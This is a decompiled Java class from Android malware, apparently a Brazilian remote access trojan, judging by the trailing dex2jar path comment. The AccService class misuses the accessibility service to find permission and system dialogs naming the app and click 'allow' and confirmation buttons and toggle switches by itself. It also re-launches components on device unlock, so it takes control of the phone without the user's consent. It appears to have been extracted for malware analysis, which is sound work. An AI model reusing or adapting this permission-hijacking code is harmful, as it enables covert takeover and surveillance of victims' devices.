package com.irifix;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AccService extends AccessibilityService {
  private static AccService a;
  
  private BroadcastReceiver b = null;
  
  public static AccService a() {
    return a;
  }
  
  private void a(List<AccessibilityNodeInfo> paramList) {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("(.* ");
    stringBuilder.append(b());
    stringBuilder.append(" .*)");
    List<AccessibilityNodeInfo> list = a.b(stringBuilder.toString(), paramList);
    paramList = a.c("(.*:id/permission_allow_button)", paramList);
    if (a.a(list) && a.a(paramList))
      ((AccessibilityNodeInfo)paramList.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK.getId()); 
  }
  
  private String b() {
    return getString(2131427368).replace("[", "\\[").replace("]", "\\]");
  }
  
  private void b(List<AccessibilityNodeInfo> paramList) {
    StringBuilder stringBuilder1 = new StringBuilder();
    stringBuilder1.append("(");
    stringBuilder1.append(h.a());
    stringBuilder1.append(")");
    List<AccessibilityNodeInfo> list1 = a.b(stringBuilder1.toString(), paramList);
    StringBuilder stringBuilder2 = new StringBuilder();
    stringBuilder2.append("(");
    stringBuilder2.append(b());
    stringBuilder2.append(")");
    List<AccessibilityNodeInfo> list2 = a.b(stringBuilder2.toString(), paramList);
    StringBuilder stringBuilder3 = new StringBuilder();
    stringBuilder3.append("(");
    stringBuilder3.append(h.b());
    stringBuilder3.append(")");
    List<AccessibilityNodeInfo> list3 = a.b(stringBuilder3.toString(), paramList);
    paramList = a.c("(.*:id/button1)", paramList);
    if (a.a(list1) && a.a(list2) && a.a(list3) && a.a(paramList))
      ((AccessibilityNodeInfo)paramList.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK.getId()); 
  }
  
  private void c(List<AccessibilityNodeInfo> paramList) {
    StringBuilder stringBuilder1 = new StringBuilder();
    stringBuilder1.append("(");
    stringBuilder1.append(h.c());
    stringBuilder1.append(")");
    List<AccessibilityNodeInfo> list1 = a.b(stringBuilder1.toString(), paramList);
    StringBuilder stringBuilder2 = new StringBuilder();
    stringBuilder2.append("(");
    stringBuilder2.append(e.a());
    stringBuilder2.append(")");
    List<AccessibilityNodeInfo> list2 = a.b(stringBuilder2.toString(), paramList);
    StringBuilder stringBuilder3 = new StringBuilder();
    stringBuilder3.append("(");
    stringBuilder3.append(h.d());
    stringBuilder3.append(")");
    List<AccessibilityNodeInfo> list3 = a.b(stringBuilder3.toString(), paramList);
    paramList = a.c("(.*:id/button2)", paramList);
    if (a.a(list1) && a.a(list2) && a.a(list3) && a.a(paramList))
      ((AccessibilityNodeInfo)paramList.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK.getId()); 
  }
  
  private void d(List<AccessibilityNodeInfo> paramList) {
    StringBuilder stringBuilder1 = new StringBuilder();
    stringBuilder1.append("(");
    stringBuilder1.append(l.a(l.e));
    stringBuilder1.append(")");
    List<AccessibilityNodeInfo> list1 = a.b(stringBuilder1.toString(), paramList);
    StringBuilder stringBuilder2 = new StringBuilder();
    stringBuilder2.append("(");
    stringBuilder2.append(b());
    stringBuilder2.append(")");
    List<AccessibilityNodeInfo> list2 = a.b(stringBuilder2.toString(), paramList);
    paramList = a.a("(android.widget.Switch)", paramList);
    if (a.a(list1) && a.a(list2) && a.a(paramList)) {
      d.a(paramList.get(0));
      performGlobalAction(1);
    } 
  }
  
  private void e(List<AccessibilityNodeInfo> paramList) {
    if (k.a()) {
      StringBuilder stringBuilder1 = new StringBuilder();
      stringBuilder1.append("(");
      stringBuilder1.append(b());
      stringBuilder1.append(")");
      List<AccessibilityNodeInfo> list1 = a.b(stringBuilder1.toString(), paramList);
      StringBuilder stringBuilder2 = new StringBuilder();
      stringBuilder2.append("(");
      stringBuilder2.append(l.a(l.b));
      stringBuilder2.append(")");
      List<AccessibilityNodeInfo> list2 = a.b(stringBuilder2.toString(), paramList);
      paramList = a.c("(.*:id/button1)", paramList);
      if (a.a(list1) && a.a(list2) && a.a(paramList))
        ((AccessibilityNodeInfo)paramList.get(0)).performAction(16); 
    } 
  }
  
  public void onAccessibilityEvent(AccessibilityEvent paramAccessibilityEvent) {
    int i = paramAccessibilityEvent.getEventType();
    c.a(paramAccessibilityEvent);
    b.a(paramAccessibilityEvent);
    if (i == 32) {
      AccessibilityNodeInfo accessibilityNodeInfo = getRootInActiveWindow();
      if (accessibilityNodeInfo == null)
        return; 
      List<AccessibilityNodeInfo> list = a.a(accessibilityNodeInfo);
      if (!a.a(list))
        return; 
      a(list);
      e.a(list);
      e.b(list);
      b(list);
      c(list);
      d(list);
      e(list);
    } 
  }
  
  public void onInterrupt() {}
  
  protected void onServiceConnected() {
    super.onServiceConnected();
    a = this;
    Context context = getApplicationContext();
    if (j.b(context)) {
      l.a(context);
      if (g.c(context)) {
        e.a(context);
      } else {
        this.b = new BroadcastReceiver(this) {
            public void onReceive(Context param1Context, Intent param1Intent) {
              e.a(param1Context);
            }
          };
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.USER_PRESENT");
        registerReceiver(this.b, intentFilter);
      } 
    } else if (Build.VERSION.SDK_INT >= 24) {
      disableSelf();
    } 
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/AccService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */